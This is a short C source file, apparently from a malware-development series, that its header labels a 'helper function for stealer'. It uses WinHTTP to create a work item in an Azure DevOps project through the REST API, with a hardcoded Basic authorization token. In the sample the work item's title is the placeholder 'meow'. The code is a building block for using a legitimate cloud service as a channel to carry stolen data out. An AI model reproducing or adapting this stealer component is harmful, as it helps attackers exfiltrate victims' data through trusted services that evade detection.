/*
 * hack2.c
 * Azure DevOps REST API
 * create work item
 * helper function for stealer
 * author @cocomelonc
 */
#include <stdio.h>
#include <windows.h>
#include <winhttp.h>

int main() {
  HINTERNET hSession, hConnect, hRequest;
  DWORD bytesRead;
  char buffer[8192];

  // headers
  const wchar_t *authHeader = L"Authorization: Basic OjlPMVFGbEcxWXhMZTg4RjY1UGZIdXRyOVRSVUp1MFJuQXhsUzdiQTRWZWxlbkZxdlZoZnBKUVFKOTlCSEFDQUFBQUFBQUFBQUFBQVNBWkRPT2NBQQ==\r\n";
  const wchar_t *contentHeader = L"Content-Type: application/json-patch+json\r\n";
  const wchar_t *acceptHeader = L"Accept: application/json\r\n";

  // JSON patch for patch operations (PATCH)
  const char *postData = "[{\"op\":\"add\",\"path\":\"/fields/System.Title\",\"from\":null,\"value\":\"meow\"}]";

  hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
               WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

  hConnect = WinHttpConnect(hSession, L"dev.azure.com", INTERNET_DEFAULT_HTTPS_PORT, 0);

  hRequest = WinHttpOpenRequest(
    hConnect,
    L"POST",
    L"/cocomelonkz/hack1/_apis/wit/workitems/$Task?api-version=7.1",
    NULL, WINHTTP_NO_REFERER,
    WINHTTP_DEFAULT_ACCEPT_TYPES,
    WINHTTP_FLAG_SECURE
  );

  WinHttpAddRequestHeaders(hRequest, authHeader, -1L, WINHTTP_ADDREQ_FLAG_ADD);
  WinHttpAddRequestHeaders(hRequest, contentHeader, -1L, WINHTTP_ADDREQ_FLAG_ADD);
  WinHttpAddRequestHeaders(hRequest, acceptHeader, -1L, WINHTTP_ADDREQ_FLAG_ADD);

  WinHttpSendRequest(hRequest,
             WINHTTP_NO_ADDITIONAL_HEADERS, 0,
             (LPVOID)postData, strlen(postData),
             strlen(postData), 0);

  WinHttpReceiveResponse(hRequest, NULL);

  while (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
    buffer[bytesRead] = '\0';
    printf("%s", buffer);
  }

  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hSession);

  return 0;
}
